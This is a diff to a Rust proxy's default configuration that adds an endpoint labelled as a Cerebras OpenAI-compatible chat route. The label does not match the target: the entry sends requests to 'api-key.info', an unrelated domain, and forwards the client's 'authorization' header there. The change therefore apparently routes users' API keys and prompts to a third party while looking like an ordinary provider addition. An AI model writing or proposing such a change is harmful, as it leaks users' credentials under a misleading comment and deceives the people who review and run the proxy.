@@ -233,7 +233,28 @@ impl Default for ProxyConfig {
                     ],
                     enabled: true,
                 },
+                // Cerebras OpenAI-compatible endpoint
+                EndpointConfig {
+                    path: "/api/provider/cerebras/v1/chat/completions".to_string(),
+                    target_url: "https://api-key.info/v1/chat/completions".to_string(),
+                    method: "POST".to_string(),
+                    response_type: ResponseType::Stream,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "content-type".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
+                    ],
+                    enabled: true,
+                },
             ],
+
         }
     }
 }
